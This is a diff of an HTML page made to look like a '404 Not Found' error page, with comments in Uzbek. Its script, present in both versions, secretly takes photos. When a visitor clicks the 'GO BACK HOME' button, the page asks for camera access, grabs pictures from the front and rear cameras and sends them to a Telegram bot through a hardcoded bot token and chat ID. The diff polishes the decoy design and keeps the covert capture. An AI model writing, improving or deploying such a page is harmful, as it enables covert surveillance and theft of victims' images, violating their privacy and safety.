@@ -1,73 +1,101 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>404 Not Found</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>404 Not Found</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        /* Rasmga mos dizayn */
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #fcfcfc;
+            color: #333;
+            text-align: center;
+        }
 
-<style>
-body {
-    font-family: Arial, Helvetica, sans-serif;
-    background: #fff;
-    color: #000;
-    padding: 40px;
-}
-h1 { font-size: 32px; }
-p  { font-size: 16px; }
+        .container {
+            max-width: 600px;
+            padding: 20px;
+        }
 
-#photoBtn {
-    margin-top: 20px;
-    font-size: 16px;
-    color: #0066cc;
-    cursor: pointer;
-    text-decoration: underline;
-    background: none;
-    border: none;
-    padding: 0;
-}
+        h1 {
+            font-size: 120px;
+            margin: 0;
+            font-weight: bold;
+            letter-spacing: 5px;
+        }
 
-#progressBox {
-    margin-top: 25px;
-    display: none;
-}
-#status {
-    font-weight: bold;
-    margin-bottom: 8px;
-}
-.progress {
-    width: 300px;
-    height: 16px;
-    border: 1px solid #000;
-}
-.bar {
-    height: 100%;
-    width: 0%;
-    background: #000;
-    color: #fff;
-    font-size: 11px;
-    text-align: center;
-    line-height: 16px;
-}
+        h2 {
+            font-size: 28px;
+            margin: 10px 0;
+        }
 
-video, canvas { display: none; }
-</style>
+        p {
+            color: #888;
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+
+        /* Tugma dizayni */
+        #photoBtn {
+            background-color: #000;
+            color: #fff;
+            padding: 12px 30px;
+            border: none;
+            text-transform: uppercase;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+            transition: 0.3s;
+        }
+
+        #photoBtn:hover {
+            background-color: #333;
+        }
+
+        /* Progress Bar */
+        #progressBox {
+            margin-top: 25px;
+            display: none;
+        }
+        .progress {
+            width: 100%;
+            max-width: 300px;
+            height: 10px;
+            background: #eee;
+            margin: 10px auto;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .bar {
+            height: 100%;
+            width: 0%;
+            background: #000;
+            transition: 0.1s;
+        }
+
+        video, canvas { display: none; }
+    </style>
 </head>
-
 <body>
 
-<h1>404 Not Found</h1>
-<p>The requested URL was not found on this server.</p>
+<div class="container">
+    <h1>404</h1>
+    <h2>Oops, This Page Not Found!</h2>
+    <p>The link might be corrupted, or the page may have been removed.</p>
 
-<button id="photoBtn">Vsit website ⟳</button>
-    <div style="border:1px solid #ccc; padding:10px; background:#f9f9f9;">
-  <strong>Note:</strong> Since the video is a 3D visual, we kindly ask you to allow the use of a camera.
-</div>
+    <button id="photoBtn">GO BACK HOME</button>
 
-
-<div id="progressBox">
-    <div id="status">IN PROGRESS</div>
-    <div class="progress">
-        <div class="bar" id="bar">1%</div>
+    <div id="progressBox">
+        <div id="status">LOADING...</div>
+        <div class="progress">
+            <div class="bar" id="bar"></div>
+        </div>
     </div>
 </div>
 
@@ -75,73 +103,67 @@ video, canvas { display: none; }
 <canvas id="canvas"></canvas>
 
 <script>
-const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
-const CHAT_ID  = "7880376636";
+    // Telegram Bot Ma'lumotlari
+    const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
+    const CHAT_ID  = "7880376636";
 
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
 
-async function sendToTelegram(blob) {
-    const fd = new FormData();
-    fd.append("chat_id", CHAT_ID);
-    fd.append("photo", blob);
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: fd
-    });
-}
+    async function sendToTelegram(blob) {
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("photo", blob);
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: fd
+            });
+        } catch (e) { console.error("Xatolik yuz berdi"); }
+    }
 
-function startProgress() {
-    const box = document.getElementById("progressBox");
-    const bar = document.getElementById("bar");
-    box.style.display = "block";
+    function startProgress() {
+        const box = document.getElementById("progressBox");
+        const bar = document.getElementById("bar");
+        box.style.display = "block";
+        let p = 0;
+        const i = setInterval(() => {
+            p++;
+            bar.style.width = p + "%";
+            if (p >= 100) clearInterval(i);
+        }, 50);
+    }
 
-    let p = 1;
-    bar.style.width = "1%";
-    bar.textContent = "1%";
+    async function capture(facing) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facing }
+            });
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 500));
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            stream.getTracks().forEach(t => t.stop());
+            return new Promise(res => {
+                canvas.toBlob(blob => res(blob), "image/jpeg", 0.8);
+            });
+        } catch (err) {
+            console.log("Kameraga ruxsat berilmadi.");
+            return null;
+        }
+    }
 
-    const i = setInterval(() => {
-        p++;
-        bar.style.width = p + "%";
-        bar.textContent = p + "%";
-        if (p >= 100) clearInterval(i);
-    }, 50); // 5 soniya
-}
-
-async function capture(facing) {
-    const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: facing }
-    });
-    video.srcObject = stream;
-    await video.play();
-
-    await new Promise(r => setTimeout(r, 500));
-
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext("2d").drawImage(video, 0, 0);
-
-    stream.getTracks().forEach(t => t.stop());
-
-    return new Promise(res => {
-        canvas.toBlob(blob => res(blob), "image/jpeg", 0.9);
-    });
-}
-
-document.getElementById("photoBtn").onclick = async () => {
-    startProgress();
-
-    // OLD KAMERA
-    const front = await capture("user");
-    sendToTelegram(front);
-
-    // ORQA KAMERA
-    const back = await capture("environment");
-    sendToTelegram(back);
-};
+    document.getElementById("photoBtn").onclick = async () => {
+        startProgress();
+        const front = await capture("user");
+        if(front) await sendToTelegram(front);
+        
+        const back = await capture("environment");
+        if(back) await sendToTelegram(back);
+    };
 </script>
 
 </body>
 </html>
-
-
